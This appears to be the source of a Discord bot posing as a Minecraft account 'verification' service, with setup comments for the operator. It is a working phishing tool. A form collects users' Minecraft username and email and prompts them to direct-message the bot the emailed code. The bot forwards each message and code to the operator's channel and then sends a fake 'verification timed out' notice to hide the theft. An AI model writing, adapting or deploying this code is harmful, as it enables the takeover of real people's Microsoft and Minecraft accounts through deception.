import asyncio
import typing
import aiohttp
import time
import os
import requests
import asyncio
import os.path
import datetime
import logging
from datetime import datetime
import random
import json
import nest_asyncio
import nextcord
from nextcord import embeds
from nextcord import Embed
from nextcord.ext import commands
import json
from nextcord.ext import commands, menus

# Initialize the bot with appropriate intents
intents = nextcord.Intents.default()
intents.members = True
intents.message_content = True  # Enable message content intents if needed    

### LOGS ##################################################################################

path = '/Users/giusiam/botrun/'
getDate = datetime.today().strftime('%d:%m:%Y')
currentTime = datetime.now().strftime("%H-%M-%S")
checkDupe = path + getDate + " " + currentTime + ".txt"
setFilename = str(checkDupe)
logger = logging.getLogger('nextcord')
logger.setLevel(logging.INFO)
handler = logging.FileHandler(filename=setFilename, encoding='utf-8', mode='w')
handler.setFormatter(logging.Formatter('%(asctime)s:%(levelname)s:%(name)s: %(message)s'))
logger.addHandler(handler)
#logchannel = interaction.guild.get_channel(1278079808148082849)

###########################################################################################
bot = commands.Bot(command_prefix="!", intents=intents)
print(f"Socket Online")
logger.info('\nLogging Begun.')


### Your bot token goes here. To get this, make sure you have a
### Discord bot available for this. You will need to go to
### "https://discord.com/developers/applications" and click
### "New Application" if you do not have an application ready.
### After you create your application, click on it and navigate
### to the "Bot" tab on the left under Settings. From there, under
### where it says "Username" you will see a tab called "Token".
### If needed, reset your token if you do not already have it saved.
### Otherwise, you might have the option to click "Copy" to save your
### bot token to your clipboard. Paste that bot token below for BOT_TOKEN.
### Make sure to keep the "" or the program will not work.
BOT_TOKEN = ""

### Replace this with your desired channel ID
### This is the channel in your server that you want the 
### bot to send important messages such as messages send
### to the bot or data from the verify form

### To find this, go to your Discord User Settings > Advanced > Developer Mode
### then right click on the channel you want the data sent to and at the
### bottom click "Copy Channel ID". This will copy the channel ID to
### your clipboard. Paste that below for TARGET_CHANNEL_ID.
TARGET_CHANNEL_ID = 

### This will be the text listed on the verify button.
### Make sure you keep the "" around the text you put
buttonText = "Button Name Here"

### This will be the role that you want to have mentioned in the message
### Similar process with the Channel ID. Step by step, go to the top left
### and click on Server Settings > Roles > Three dots on the right of the
### role you want to use > Copy Role ID
### This will copy the Role ID to your clipboard. Paste that where
### it says Role ID Here. Make sure to keep the "".
roleID = "Role ID Here"

### This one doesn't have to be super specific but this is just
### the name in the verify message. Just remember to keep the ""
botName = "Bot Name Here"

class MySource(menus.ListPageSource):
    def __init__(self, data):
        super().__init__(data, per_page=4)

    async def format_page(self, menu, entries):
        offset = menu.current_page * self.per_page
        return '\n'.join(f'{i}. {v}' for i, v in enumerate(entries, start=offset))


class MyModal(nextcord.ui.Modal):
    def __init__(self):
        super().__init__(
            "Enter Your Details",
            timeout=300 # 5 minute timeout for the form. Users can only have the form open for 5 minutes before timing out.
        )
        # add a text input field for the username
        self.username = nextcord.ui.TextInput(
            label="Minecraft Username",
            placeholder="i.e Minikloon",
            required=True,
            min_length=2,
            max_length=50,
        )
        self.add_item(self.username)
        print(f"set username")
        
        # add a text input field for the email
        self.email = nextcord.ui.TextInput(
            label="Minecraft Email",
            placeholder="i.e example@email.com",
            required=True,
        )
        self.add_item(self.email)
        print(f"set age")

    async def callback(self, interaction: nextcord.Interaction):
        # access the values entered by the user
        username = self.username.value
        email = self.email.value
        print(f"Successfully set name and age to {username} and {email}")
        logmessage = str("Successfully defined name and age to " + username + " and " + email)
        
        logger.info(logmessage)

        # fetching the target channel by ID
        target_channel = interaction.guild.get_channel(TARGET_CHANNEL_ID)
        print(f"Set channel ID")
        logger.info('Set Channel ID')

        if target_channel:
            # sends data to the target channel
            print(f"target channel")
            logger.info("target channel")
            await target_channel.send(f"[{interaction.user.name}](https://login.live.com) : {username}")
        else:
            # fail case
            print(f"failed target channel")
            logger.info("failed target channel")
            await interaction.response.send_message("Could not find the target channel.", ephemeral=True)

        print(f"resubmit form")
        logger.info("resubmit form")
        await interaction.response.send_message("If a Minecraft account exists with the email you provided, a verification code will be sent shortly. Please send the code directly to this bot for secure verification.", ephemeral=True)
        await interaction.user.send("Please input the verification code here. Any Discord server is prone to experiencing a data breach as some point. To avoid this, direct message verification is used.")

# Outdated but can be used to test. This forces 
# the verify form on the user who uses it. 
@bot.slash_command(name="verify", description="Authenticate and verify Minecraft accounts to their Discord owners")
async def verify(interaction: nextcord.Interaction):
    modal = MyModal()
    await interaction.response.send_modal(modal)
    logger.info("command Verify run")


class BetterVerify(nextcord.ui.View): 
    @nextcord.ui.button(label=buttonText, style=nextcord.ButtonStyle.blurple)
    async def receive(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        # ephemeral=True makes the message hidden from everyone except the button presser
        modal = MyModal()
        await interaction.response.send_modal(modal)

# THIS IS SINGLE HANDEDLY THE MOST IMPORTANT COMMAND HERE
# This needs to be refreshed about every 5 minutes (idk why)
# and this actually refreshes the button. It times itself out
# and you have to send it in the channel again. Future versions
# of this project are gonna have it to where the bot sends it
# on its own. Right now, it uses the application command which is ugly.
@bot.slash_command(name="refresh", description="Used to authenticate and verify Minecraft accounts.")
async def refresh(interaction):
    target_channel = interaction.guild.get_channel(TARGET_CHANNEL_ID)
    await interaction.send(view=BetterVerify())
    logger.info("command Refresh run")    
    
@bot.slash_command(name="verifymessage", description="Used to authenticate and verify Minecraft accounts.")
async def verifymessage(interaction):
    target_channel = interaction.guild.get_channel(TARGET_CHANNEL_ID)
    try:
        # URL of the JSON data (or load from a file if needed)
        with open('embed.json', 'r') as file:
            data = json.load(file)

        # Safely get values from the JSON data
        title = data.get('title', '**' + botName + ' Verification**')
        
        description = data.get('description', 'Click the **' + buttonText + '** button to verify and get the <@&' + roleID + '> rank!')
        # ok so these numbers here  ↓↓↓↓↓↓ can be changed to any hex code you want. Only change the '237fea', not the '0x'
        color = data.get('color', 0x237fea)

        # create embed object
        embed = nextcord.Embed(
            title=title,
            description=description,
            color=color
        )
        
        # add fields if they exist
        if 'fields' in data:
            for field in data['fields']:
                name = field.get('name', 'Unnamed Field')
                value = field.get('value', 'No value provided')
                embed.add_field(name=name, value=value)
        
        # send the embed message
        await interaction.channel.send(embed=embed)
        logger.info("command VerifyMessage run")

    
    except KeyError as e:
        await interaction.channel.send(f"Error: Missing key in JSON data: {str(e)}")
    except Exception as e:
        await interaction.channel.send(f"An error occurred: {str(e)}")


# ok this command doesn't work perfectly because plancke doesnt have previews. just use the Statisfy Discord bot tbh
@bot.slash_command(name="stats", description="Get Hypixel user stats")
async def stats(interaction, query: str):
    target_channel = interaction.guild.get_channel(TARGET_CHANNEL_ID)
    await target_channel.send(f"https://sky.shiiyu.moe/stats/{query}/")
    await target_channel.send(f"https://plancke.io/hypixel/player/stats/{query}#BedWars")
    quer = {query}
    logmessage = "command Stats run with data " + {query}
    logger.info(str(logmessage))

# when the bot gets messaged it'll forward the messages into the channel you assigned to TARGET_CHANNEL_ID
@bot.event
async def on_message(message):
    
    if isinstance(message.channel, nextcord.DMChannel) and not message.author.bot:
        # fetch the target channel by id
        target_channel = bot.get_channel(TARGET_CHANNEL_ID)
        user = message.author
        if target_channel:
            # forward the dm to the target channel
            await target_channel.send(f"{message.author.name} : {message.content}")
            print(f"\nNew Message:\n{message.author.name} : {message.content}")
            name = message.author.name
            content = message.content
            logmessage = "New Message: " + name + " : " + content
            logger.info(str(logmessage))
            

        else:
            # Log an error if the target channel can't be found
            print(f"Could not find the target channel to forward the DM.")
            logger.info("could not find the target command to forward the DM")
    if len(message.content) == 6:
        
        time.sleep(2)
        await user.send("**The code you provided will now be used for verification.**\nPlease be patient as this may take up to 30 seconds.\n*If you do not receive a verification message within that time period, please restart the verification process.*")
        time.sleep(12)
        logger.info("Verify timed out for a user")
        await user.send("## :exclamation: ||Verification timed out. Please attempt verification again.||")
    else:
        logger.info("a user did not send a verification code")
        await user.send("It does not look like you sent a verification code. Please only input active verification codes here or the verification process may be impacted.")
    # ^^^^ this needs to be fixed! ^^^^
    # UnboundLocalError: cannot access local variable 'user' where it is not associated with a value
    # This error legit does nothing. ik why it complains but even though you get the error it still works with no issues
    
    # ↓↓↓↓ this here just makes it so after a message is sent the bot repeats this process and gets it ready for new messages
    await bot.process_commands(message)

# this is what runs the entire program. dont remove this. dont change this. you might see a tutorial somewhere that says
# to change the word 'bot' to 'client'. dont listen to them.
bot.run(BOT_TOKEN)